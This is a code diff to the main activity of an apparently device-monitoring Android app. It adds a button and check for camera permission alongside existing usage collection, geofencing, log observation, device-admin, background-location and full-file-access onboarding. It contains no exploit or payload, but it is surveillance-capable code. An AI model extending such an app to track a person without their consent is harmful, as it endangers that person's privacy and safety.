@@ -3,6 +3,7 @@ package com.spapp.monitoring.ui
 import android.Manifest
 import android.content.ComponentName
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -40,6 +41,10 @@ class MainActivity : AppCompatActivity() {
     private lateinit var usageCollector: AppUsageCollector
     private lateinit var geofenceManager: GeofenceManager
 
+    private val cameraPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { refreshPermissionButtons() }
+
     private val backgroundLocationLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { refreshPermissionButtons() }
@@ -71,6 +76,10 @@ class MainActivity : AppCompatActivity() {
         SyncScheduler.schedule(applicationContext)
         uploadCurrentFcmToken()
         com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
+
+        binding.btnGrantCameraPermission.setOnClickListener {
+            cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
+        }
 
         binding.btnGrantUsageAccess.setOnClickListener {
             startActivity(usageCollector.usageAccessSettingsIntent())
@@ -268,6 +277,13 @@ class MainActivity : AppCompatActivity() {
             binding.btnOpenAppInfo.visibility = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) android.view.View.VISIBLE else android.view.View.GONE
         }
 
+        val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.CAMERA
+        ) == PackageManager.PERMISSION_GRANTED
+        binding.btnGrantCameraPermission.visibility =
+            if (hasCameraPermission) android.view.View.GONE else android.view.View.VISIBLE
+
         binding.btnGrantUsageAccess.visibility =
             if (usageCollector.hasUsageAccess()) android.view.View.GONE else android.view.View.VISIBLE
 
@@ -294,7 +310,8 @@ class MainActivity : AppCompatActivity() {
         binding.btnGrantAutostart.visibility =
             if (hasBatteryExemption) android.view.View.GONE else android.view.View.VISIBLE
 
-        val anyOtherNeeded = !usageCollector.hasUsageAccess() ||
+        val anyOtherNeeded = !hasCameraPermission ||
+                !usageCollector.hasUsageAccess() ||
                 needsBackgroundLocation ||
                 !SpappDeviceAdminReceiver.isActive(this) ||
                 !hasFullFileAccess ||
